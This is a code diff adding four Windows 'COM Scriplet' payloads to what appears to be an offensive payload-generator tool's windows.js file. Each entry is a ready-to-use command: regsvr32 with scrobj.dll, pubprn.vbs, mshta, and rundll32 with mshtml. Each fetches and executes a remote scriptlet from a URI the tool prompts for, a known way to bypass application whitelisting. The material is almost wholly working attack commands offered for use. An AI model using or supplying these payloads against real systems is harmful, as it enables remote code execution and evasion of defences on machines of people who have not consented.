+++ payloads/windows.js
@@ -226,6 +226,49 @@ Load({
 })
 
 
+// ############### COM Scriplets ######################
+// # Credit to @subTee & @enigma0x3 for payloads
+
+Load({
+	title: "regsrv32.exe scriplet",
+	payload: 'regsvr32.exe <PROMPT (Full URI to scriplet)> scrobj.dll',
+	category: "COM Scriplets",
+	callback: function(bro){
+	    question("Enter the full path to your remote COM scriplet: ")
+	    ask.some(questions, bro);
+	}
+})
+
+Load({
+	title: "Pubprn.vbs GetObject",
+	payload: 'C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs localhost "script:<PROMPT (Full URI to scriplet)>"',
+	category: "COM Scriplets",
+	callback: function(bro){
+	    question("Enter the full path to your remote COM scriplet: ")
+	    ask.some(questions, bro);
+	}
+})
+
+Load({
+	title: "mshta command line",
+	payload: 'mshta javascript:GetObject(\'script:<PROMPT (Full URI to scriplet)>\');window.close();',
+	category: "COM Scriplets",
+	callback: function(bro){
+	    question("Enter the full path to your remote COM scriplet: ")
+	    ask.some(questions, bro);
+	}
+})
+
+Load({
+	title: "rundll32.exe scriplet",
+	payload: 'rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\'WScript.Shell\');GetObject(\'script:<PROMPT (Full URI to scriplet)>\');window.close()");',
+	category: "COM Scriplets",
+	callback: function(bro){
+	    question("Enter the full path of your hosted COM scriplet: ")
+	    ask.some(questions, bro);
+	}
+})
+
 /*
 ######################################################
 ############### End of Payloads ######################